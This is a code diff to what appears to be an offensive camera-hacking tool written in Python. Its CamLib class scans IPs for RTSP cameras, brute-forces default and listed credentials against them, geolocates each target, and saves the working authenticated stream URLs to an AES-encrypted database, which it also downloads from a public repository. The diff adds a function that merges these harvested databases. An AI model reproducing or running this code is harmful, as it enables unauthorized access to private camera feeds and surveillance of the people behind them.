@@ -7,8 +7,10 @@
 # ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
 # ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
 import re
+import os
 import sys
 import time
+from datetime import datetime
 import random
 import socket
 import base64
@@ -28,7 +30,8 @@ log = LogCat()
 class CamLib():
     def __init__(self):
         self.KEY = b'S-H4CK13@M4ptnh!' 
-        self.IV = b'14' + b'\x00' * 14    
+        self.IV = b'14' + b'\x00' * 14   
+        self.SEP = b'\uE000' 
         self.LOCAL_DB = './data/global.bc'
         self.DB = 'https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc'
         self.TIMEOUT=3
@@ -344,7 +347,6 @@ class CamLib():
             for future in as_completed(future_to_ip):
                 ip = future_to_ip[future]
                 res = future.result()
-
                 if res:
                     log.info(f"Camera detected: [\033[33m{ip}\033[0m]")
                     alive.append(ip)
@@ -361,11 +363,11 @@ class CamLib():
         return unpad(cipher.decrypt(encrypted), AES.block_size).decode('utf-8') 
     
  
-    def get_LocalDB_data(self):
+    def get_LocalDB_data(self,path_file:str):
         data = []
         try:
-            with open(self.LOCAL_DB, 'rb') as f:
-                for l in f.read().split(b'\uE000'):
+            with open(path_file, 'rb') as f:
+                for l in f.read().split(self.SEP):
                     if not l:   
                         continue
                     data.append(json.loads(self.aes_decrypt(l)))
@@ -381,7 +383,8 @@ class CamLib():
             url = self.DB
         try:
             enc = requests.get(url,verify=False,timeout=5).content
-            for l in enc.split(b'\uE000'):
+            
+            for l in enc.split(self.SEP):
                 if not l:   
                         continue
                 data.append(json.loads(self.aes_decrypt(l)))
@@ -390,21 +393,68 @@ class CamLib():
             return False
         else:
             return data
+    
+    def merge_all_bc(self, src_dir="./data"):
+        merged = {}
 
-    def save_info(self, rtsp_url: str, ip_data: str):
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        out_file = f"./data/{ts}.bc"
+
+        if os.path.exists(out_file):
+            os.remove(out_file)
+
+        total_read = 0  
+
+        for name in os.listdir(src_dir):
+            if not name.endswith(".bc"):
+                continue
+
+            path = os.path.join(src_dir, name)
+
+            records = self.get_LocalDB_data(path)
+            count = len(records) if records else 0
+            total_read += count
+
+            log.info(f"Adding {path} to merge buffer... {count} records")
+
+            if not records:
+                continue
+
+            for item in records:
+                rtsp = item.get("rtsp")
+                data = item.get("data")
+
+                if not rtsp or not data:
+                    continue
+
+ 
+                if rtsp not in merged:
+                    merged[rtsp] = data
+
+        log.warning(
+            f"Saving as new {ts}.bc  Estimated merged records: {len(merged)}"
+        )
+
+        for rtsp, data in merged.items():
+            self.save_info(rtsp, data, out_file)
+
+        log.success(f"Successfully merged and updated data to {out_file}")
+
+    def save_info(self, rtsp_url: str, ip_data: str,path_file:str,ver=None):
         record = {
             "rtsp": rtsp_url,
             "data": ip_data
         }
         try:
-            with open(self.LOCAL_DB , 'ab') as f:
+            with open(path_file , 'ab') as f:
                 data = json.dumps(record, ensure_ascii=False)
                 bin_data = self.aes_encrypt(data)  
-                f.write(bin_data+b'\uE000')
+                f.write(bin_data+self.SEP)
         except Exception as e:
             log.error("Failed to save results, check permissions or if the file exists...")
         else:
-            log.info(f"Results successfully appended to: [\033[33m{self.LOCAL_DB}\033[0m]")
+            if ver:
+                log.info(f"Results successfully appended to: [\033[33m{path_file}\033[0m]")
 
     def run(self, ip: str, port=554,password=''):
         def extract_ip(rtsp):
@@ -416,8 +466,10 @@ class CamLib():
         ip_data = self.show_location(ip)
         if not ip_data:
             return 0
-        data = self.get_LocalDB_data()
-        ip_set = {extract_ip(r['rtsp']) for r in data}
+        data = self.get_LocalDB_data(self.LOCAL_DB)
+        if not data:
+            data = []
+        ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
         if ip in ip_set:
             log.warning("This IP has already been recorded...")
             return 0
@@ -457,7 +509,7 @@ class CamLib():
         if paths_no_auth:
             rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
             log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
-            self.save_info(rtsp_url,ip_data)
+            self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
             return 1
         if not paths_with_401:
             paths_with_401 = ["/"]  
@@ -477,7 +529,7 @@ class CamLib():
                     log.info(f"Found credentials : [{u}:{p}]",f"{u}:{p}")
                     rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
                     log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
-                    self.save_info(rtsp_url,ip_data)
+                    self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
                     return 1
                 else:
                     sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
